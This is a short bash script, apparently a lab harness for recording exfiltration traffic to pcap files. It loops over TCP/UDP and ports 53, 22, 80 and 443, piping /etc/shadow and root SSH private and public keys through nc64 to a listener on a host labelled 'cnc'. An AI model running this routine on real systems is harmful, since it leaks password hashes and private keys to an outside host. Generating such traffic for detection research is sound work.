#!/bin/bash

cnc='10.0.242.194'
host='10.0.242.193'

files=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
ports=( '53' '22' '80' '443' )
proto=( 't' 'u' )
ipver=( '4' '6' '46' )

working_dir='/tmp'
#working_dir='/var/pcap/experiments'

for protocol in "${proto[@]}"; do
	for port in "${ports[@]}"; do

		echo "starting tcpdump for $protocol-$port.pcap"
		tcpdump -i eth2 -w $working_dir/nc64-$protocol-$port.pcap > /dev/null &
		echo "sleeping before sending data"
		sleep 1

		for file in "${files[@]}"; do
			echo "starting listener on port $port with protocol -$protocol"
			ssh root@$cnc "/root/nc64-master/nc64.py -l -$protocol -p $port >> /tmp/nc64.log &" || echo fail
			sleep 2

			echo "attempting file transfer $file on port $port with protocol -$protocol"
			ssh root@$host "cat $file | /root/nc64/nc64-master/nc64.py -h4 192.168.12.12 -h6 2a02:1010:12::12 -$protocol -p $port " || echo fail
			sleep 2
		done

		echo "killing tcpdump"
		pkill tcpdump
		sleep 2
	done
done
